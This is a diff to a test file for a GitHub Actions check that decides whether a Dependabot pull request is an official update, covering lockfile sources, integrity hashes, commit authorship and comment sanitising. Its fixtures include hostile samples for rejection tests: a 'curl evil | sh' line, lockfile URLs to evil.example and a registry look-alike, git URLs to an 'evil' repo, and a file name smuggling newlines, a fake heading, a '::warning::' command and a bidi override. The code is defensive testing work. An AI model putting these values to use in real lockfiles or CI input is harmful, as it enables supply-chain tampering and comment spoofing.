@@ -1,8 +1,22 @@
 import { describe, expect, test } from 'bun:test';
-import { MARKER, buildComment, classifyUpdate, run } from './update-check.cjs';
+import {
+  MARKER,
+  STATUS_CONTEXT,
+  buildComment,
+  classifyUpdate,
+  clean,
+  run,
+} from './update-check.cjs';
 
 type PullRequest = Parameters<typeof classifyUpdate>[0];
 type ChangedFile = Parameters<typeof classifyUpdate>[1][number];
+type Commit = Parameters<typeof classifyUpdate>[2][number];
+
+const BOT = { login: 'dependabot[bot]' };
+
+function commit(overrides: Partial<Commit> = {}): Commit {
+  return { sha: 'c0ffee1234567', author: BOT, committer: BOT, ...overrides };
+}
 
 const REPO = 'example-co/website';
 
@@ -34,9 +48,18 @@ function countLines(patch: string) {
   };
 }
 
-// The event payload reports `changed_files`; by default it matches the list.
-function classify(pr: PullRequest, files: ChangedFile[]) {
-  return classifyUpdate({ changed_files: files.length, ...pr }, files);
+// The event payload reports `changed_files` and `commits`; by default they
+// match the lists. By default the pull request has one Dependabot commit.
+function classify(
+  pr: PullRequest,
+  files: ChangedFile[],
+  commits: Commit[] = [commit()],
+) {
+  return classifyUpdate(
+    { changed_files: files.length, commits: commits.length, ...pr },
+    files,
+    commits,
+  );
 }
 
 const packageJsonPatch = `@@ -11,7 +11,7 @@
@@ -107,7 +130,7 @@ describe('classifyUpdate', () => {
       modified(
         'package-lock.json',
         `${packageLockPatch}
-@@ -400,7 +400,7 @@
+@@ -400,3 +400,3 @@
      "node_modules/hono": {
 -      "version": "4.13.13",
 +      "version": "4.13.14",
@@ -117,12 +140,229 @@ describe('classifyUpdate', () => {
     expect(result).toEqual({ official: true, reasons: [] });
   });
 
-  test('a lockfile diff that GitHub did not include is allowed', () => {
+  test('a bun.lock diff that GitHub did not include is allowed', () => {
     const result = classify(pullRequest(), [
       modified('package.json', packageJsonPatch),
       { filename: 'bun.lock', status: 'modified' },
     ]);
     expect(result).toEqual({ official: true, reasons: [] });
+  });
+
+  test('a package-lock.json diff that GitHub did not include is not official', () => {
+    const result = classify(pullRequest(), [
+      modified('package.json', packageJsonPatch),
+      { filename: 'package-lock.json', status: 'modified' },
+    ]);
+    expect(result.reasons).toEqual([
+      'the diff of package-lock.json is not available',
+    ]);
+  });
+
+  test('a package-lock.json diff with a left-out hunk is not official', () => {
+    const result = classify(pullRequest(), [
+      modified('package.json', packageJsonPatch),
+      modified('package-lock.json', packageLockPatch, {
+        additions: 9,
+        deletions: 4,
+      }),
+    ]);
+    expect(result.reasons).toEqual([
+      'the diff of package-lock.json is incomplete',
+    ]);
+  });
+
+  const lockfileWith = (line: string) => `@@ -120,3 +120,3 @@
+     "node_modules/@goodnight-web/server": {
+-      "version": "0.1.0",
++      ${line}
+       "license": "MIT",`;
+
+  test.each([
+    [
+      'another registry',
+      '"resolved": "https://evil.example/@goodnight-web/server/-/server-0.1.1.tgz",',
+      'URL outside https://registry.npmjs.org/',
+    ],
+    [
+      'a git+ URL',
+      '"resolved": "git+ssh://git@github.com/evil/server.git#abc",',
+      'entry not from the npm registry',
+    ],
+    [
+      'a file: path',
+      '"resolved": "file:../server",',
+      'entry not from the npm registry',
+    ],
+    ['a link entry', '"link": true,', 'entry not from the npm registry'],
+    [
+      'plain http',
+      '"resolved": "http://registry.npmjs.org/a/-/a-1.0.0.tgz",',
+      'entry not from the npm registry',
+    ],
+    [
+      'a sha1 integrity',
+      '"integrity": "sha1-AAAA",',
+      'integrity is not sha512',
+    ],
+    [
+      'a registry look-alike',
+      '"resolved": "https://registry.npmjs.org.evil.example/a/-/a-1.0.0.tgz",',
+      'URL outside https://registry.npmjs.org/',
+    ],
+    [
+      'a line that is not lockfile content',
+      'curl evil | sh',
+      'unexpected line',
+    ],
+  ])(
+    'a package-lock.json entry with %s is not official',
+    (_name, line, reason) => {
+      const result = classify(pullRequest(), [
+        modified('package.json', packageJsonPatch),
+        modified('package-lock.json', lockfileWith(line)),
+      ]);
+      expect(result.official).toBe(false);
+      expect(result.reasons.join('\n')).toContain(reason);
+    },
+  );
+
+  test('a real new lockfile entry with funding links is official', () => {
+    const result = classify(pullRequest(), [
+      modified('package.json', packageJsonPatch),
+      modified(
+        'package-lock.json',
+        `@@ -500,0 +500,16 @@
++    "node_modules/new-dep": {
++      "version": "1.2.3",
++      "resolved": "https://registry.npmjs.org/new-dep/-/new-dep-1.2.3.tgz",
++      "integrity": "sha512-q83XyMOzG0a/8r9fEQDOIvKBxxk1SrNkEKzXz7HsGdFO+3OW2RimuJdLaw4w6VMpvT6S+zqIWZ5RX0NNHkAg+A==",
++      "license": "MIT",
++      "engines": {
++        "node": ">=18"
++      },
++      "funding": [
++        "https://github.com/sponsors/someone",
++        {
++          "type": "opencollective",
++          "url": "https://opencollective.com/new-dep"
++        }
++      ]
++    },`,
+      ),
+    ]);
+    expect(result).toEqual({ official: true, reasons: [] });
+  });
+
+  test('a git URL in another lockfile is not official', () => {
+    const result = classify(pullRequest(), [
+      modified('package.json', packageJsonPatch),
+      modified(
+        'bun.lock',
+        `@@ -1,1 +1,1 @@
+-    "hono": ["hono@4.13.13", "", {}, "sha512-AAAA"],
++    "hono": ["hono@github:evil/hono", "", {}, ""],`,
+      ),
+    ]);
+    expect(result.reasons.join('\n')).toContain(
+      'bun.lock: entry not from the npm registry',
+    );
+  });
+
+  test('a commit by another author is not official', () => {
+    const result = classify(
+      pullRequest(),
+      [modified('package.json', packageJsonPatch)],
+      [commit(), commit({ sha: 'bad0000', author: { login: 'mallory' } })],
+    );
+    expect(result.reasons).toEqual([
+      'commit bad0000: author is not dependabot[bot]: mallory',
+    ]);
+  });
+
+  test('a commit pushed by another committer is not official', () => {
+    const result = classify(
+      pullRequest(),
+      [modified('package.json', packageJsonPatch)],
+      [commit({ sha: 'bad0000', committer: { login: 'mallory' } })],
+    );
+    expect(result.reasons).toEqual([
+      'commit bad0000: committer is not dependabot[bot]: mallory',
+    ]);
+  });
+
+  test('a commit made in the GitHub web interface is not official', () => {
+    const result = classify(
+      pullRequest(),
+      [modified('package.json', packageJsonPatch)],
+      [commit({ sha: 'bad0000', committer: { login: 'web-flow' } })],
+    );
+    expect(result.reasons).toEqual([
+      'commit bad0000: committer is not dependabot[bot]: web-flow',
+    ]);
+  });
+
+  test('a commit without a linked GitHub account is not official', () => {
+    const result = classify(
+      pullRequest(),
+      [modified('package.json', packageJsonPatch)],
+      [commit({ sha: 'bad0000', author: null, committer: null })],
+    );
+    expect(result.reasons).toEqual([
+      'commit bad0000: author is not dependabot[bot]: no GitHub account',
+      'commit bad0000: committer is not dependabot[bot]: no GitHub account',
+    ]);
+  });
+
+  test('a commit list at the API limit of 250 is not official', () => {
+    const commits = Array.from({ length: 250 }, () => commit());
+    const result = classify(
+      pullRequest(),
+      [modified('package.json', packageJsonPatch)],
+      commits,
+    );
+    expect(result.reasons).toEqual([
+      'the list of commits may be incomplete: listed 250, expected 250',
+    ]);
+  });
+
+  test('a commit list that does not match commits is not official', () => {
+    const result = classifyUpdate(
+      { ...pullRequest(), changed_files: 1, commits: 2 },
+      [modified('package.json', packageJsonPatch)],
+      [commit()],
+    );
+    expect(result.reasons).toEqual([
+      'the list of commits may be incomplete: listed 1, expected 2',
+    ]);
+  });
+
+  test('an empty commit list is not official', () => {
+    const result = classify(
+      pullRequest(),
+      [modified('package.json', packageJsonPatch)],
+      [],
+    );
+    expect(result.official).toBe(false);
+  });
+
+  test('CR, LF, and format characters in a file name are cleaned', () => {
+    const result = classify(pullRequest(), [
+      modified('package.json', packageJsonPatch),
+      {
+        filename:
+          'x\r\n### ✅ Official goodnight-web update\n::warning::x\u202e',
+        status: 'modified',
+      },
+    ]);
+    expect(result.official).toBe(false);
+    const [reason] = result.reasons;
+    expect(reason).not.toMatch(/[\r\n\u202e]/);
+    expect(reason).toBe(
+      'file other than package.json or a lockfile changed: x??### ✅ Official goodnight-web update?::warning::x?',
+    );
+    const body = buildComment(result, '0123456789');
+    expect(body).not.toContain('\n### ✅ Official');
+    expect(body).toContain(`- \`${reason}\``);
   });
 
   test('author other than dependabot[bot]', () => {
@@ -186,7 +426,7 @@ describe('classifyUpdate', () => {
     const result = classify(pullRequest(), [
       modified(
         'bun.lock',
-        `@@ -50,3 +50,3 @@
+        `@@ -50,1 +50,1 @@
 -    "hono": ["hono@4.13.13", "", {}, "sha512-AAAA"],
 +    "hono": ["hono@4.13.14", "", {}, "sha512-BBBB"],`,
       ),
@@ -319,7 +559,11 @@ describe('classifyUpdate', () => {
   test('a file list that does not match changed_files is not official', () => {
     const files = [modified('package.json', packageJsonPatch)];
     for (const changed_files of [2, undefined]) {
-      const result = classifyUpdate(pullRequest({ changed_files }), files);
+      const result = classifyUpdate(
+        pullRequest({ changed_files, commits: 1 }),
+        files,
+        [commit()],
+      );
       expect(result.official).toBe(false);
       expect(result.reasons[0]).toContain(
         'the list of changed files may be incomplete',
@@ -377,26 +621,57 @@ describe('buildComment', () => {
     expect(body.startsWith(MARKER)).toBe(true);
     expect(body).toContain('公式のアップデートではありません');
     expect(body).toContain("If you don't understand the changes, don't merge.");
-    expect(body).toContain('- author is not dependabot[bot]: someone');
+    expect(body).toContain('- `author is not dependabot[bot]: someone`');
+  });
+
+  test('reasons are code spans with no backticks or line breaks', () => {
+    const body = buildComment(
+      { official: false, reasons: ['a `b`\n<img src=x>'] },
+      'abcdef0123',
+    );
+    expect(body).toContain("- `a 'b'?<img src=x>`");
+  });
+});
+
+describe('clean', () => {
+  test('replaces control and format characters and cuts long text', () => {
+    expect(clean('a\rb\nc\u0000d\u2028e\u200bf\u202eg')).toBe('a?b?c?d?e?f?g');
+    expect(clean('x'.repeat(300))).toBe(`${'x'.repeat(200)}...`);
   });
 });
 
 describe('run', () => {
   type Comment = { id: number; body: string; user: { login: string } };
 
-  function fakeToolkit(comments: Comment[], files: ChangedFile[] | Error) {
+  function fakeToolkit(
+    comments: Comment[],
+    files: ChangedFile[] | Error,
+    commits: Commit[] | Error = [commit()],
+  ) {
     const calls: { method: string; params: Record<string, unknown> }[] = [];
     const listFiles = Symbol('listFiles');
+    const listCommits = Symbol('listCommits');
     const listComments = Symbol('listComments');
     const toolkit = {
       github: {
         paginate: async (method: unknown) => {
-          if (method !== listFiles) return comments;
-          if (files instanceof Error) throw files;
-          return files;
+          if (method === listFiles) {
+            if (files instanceof Error) throw files;
+            return files;
+          }
+          if (method === listCommits) {
+            if (commits instanceof Error) throw commits;
+            return commits;
+          }
+          return comments;
         },
         rest: {
-          pulls: { listFiles },
+          pulls: { listFiles, listCommits },
+          repos: {
+            createCommitStatus: async (params: Record<string, unknown>) => {
+              calls.push({ method: 'createCommitStatus', params });
+            },
+          },
           issues: {
             listComments,
             createComment: async (params: Record<string, unknown>) => {
@@ -412,6 +687,7 @@ describe('run', () => {
         payload: {
           pull_request: pullRequest({
             changed_files: files instanceof Error ? 1 : files.length,
+            commits: commits instanceof Error ? 1 : commits.length,
           }),
         },
         repo: { owner: 'example-co', repo: 'website' },
@@ -422,14 +698,49 @@ describe('run', () => {
   }
 
   const files = [modified('package.json', packageJsonPatch)];
+  const comments = (calls: { method: string }[]) =>
+    calls.filter((call) => call.method !== 'createCommitStatus');
+  const statuses = (
+    calls: { method: string; params: Record<string, unknown> }[],
+  ) =>
+    calls
+      .filter((call) => call.method === 'createCommitStatus')
+      .map((call) => call.params);
 
   test('creates the comment when there is none', async () => {
     const { toolkit, calls } = fakeToolkit([], files);
     const result = await run(toolkit);
     expect(result.official).toBe(true);
-    expect(calls).toHaveLength(1);
+    expect(comments(calls)).toHaveLength(1);
     expect(calls[0]?.method).toBe('createComment');
     expect(calls[0]?.params.issue_number).toBe(7);
+  });
+
+  test('sets a success status on the head commit for an official update', async () => {
+    const { toolkit, calls } = fakeToolkit([], files);
+    await run(toolkit);
+    expect(statuses(calls)).toEqual([
+      {
+        owner: 'example-co',
+        repo: 'website',
+        sha: '0123456789abcdef',
+        context: STATUS_CONTEXT,
+        state: 'success',
+        description: 'Official goodnight-web update',
+      },
+    ]);
+    expect(STATUS_CONTEXT).toBe('goodnight-web/update-check');
+  });
+
+  test('sets a failure status when the update is not official', async () => {
+    const { toolkit, calls } = fakeToolkit([], files, [
+      commit({ committer: { login: 'web-flow' } }),
+    ]);
+    const result = await run(toolkit);
+    expect(result.official).toBe(false);
+    expect(statuses(calls)).toMatchObject([
+      { sha: '0123456789abcdef', state: 'failure' },
+    ]);
   });
 
   test('updates its own comment instead of adding another one', async () => {
@@ -445,12 +756,12 @@ describe('run', () => {
       files,
     );
     await run(toolkit);
-    expect(calls).toHaveLength(1);
+    expect(comments(calls)).toHaveLength(1);
     expect(calls[0]?.method).toBe('updateComment');
     expect(calls[0]?.params.comment_id).toBe(2);
   });
 
-  test('does nothing when the comment is already up to date', async () => {
+  test('does not touch an up-to-date comment, but still sets the status', async () => {
     const body = buildComment(
       { official: true, reasons: [] },
       '0123456789abcdef',
@@ -460,24 +771,33 @@ describe('run', () => {
       files,
     );
     await run(toolkit);
-    expect(calls).toHaveLength(0);
+    expect(comments(calls)).toHaveLength(0);
+    expect(statuses(calls)).toMatchObject([{ state: 'success' }]);
   });
 
-  test('replaces an official comment with the warning when files cannot be listed', async () => {
-    const official = buildComment(
-      { official: true, reasons: [] },
-      '0123456789abcdef',
-    );
-    const { toolkit, calls } = fakeToolkit(
-      [{ id: 2, body: official, user: { login: 'github-actions[bot]' } }],
-      new Error('API rate limit exceeded'),
-    );
-    await expect(run(toolkit)).rejects.toThrow('API rate limit exceeded');
-    expect(calls).toHaveLength(1);
-    expect(calls[0]?.method).toBe('updateComment');
-    expect(calls[0]?.params.body).toContain('This is not an official update');
-    expect(calls[0]?.params.body).toContain(
-      'the list of changed files could not be read',
-    );
-  });
+  test.each([
+    ['files', new Error('API rate limit exceeded'), [commit()]],
+    ['commits', files, new Error('API rate limit exceeded')],
+  ] as const)(
+    'replaces an official comment with the warning when %s cannot be listed',
+    async (_name, listedFiles, listedCommits) => {
+      const official = buildComment(
+        { official: true, reasons: [] },
+        '0123456789abcdef',
+      );
+      const { toolkit, calls } = fakeToolkit(
+        [{ id: 2, body: official, user: { login: 'github-actions[bot]' } }],
+        listedFiles instanceof Error ? listedFiles : [...listedFiles],
+        listedCommits instanceof Error ? listedCommits : [...listedCommits],
+      );
+      await expect(run(toolkit)).rejects.toThrow('API rate limit exceeded');
+      expect(comments(calls)).toHaveLength(1);
+      expect(calls[0]?.method).toBe('updateComment');
+      expect(calls[0]?.params.body).toContain('This is not an official update');
+      expect(calls[0]?.params.body).toContain(
+        'the list of changed files or commits could not be read',
+      );
+      expect(statuses(calls)).toMatchObject([{ state: 'error' }]);
+    },
+  );
 });
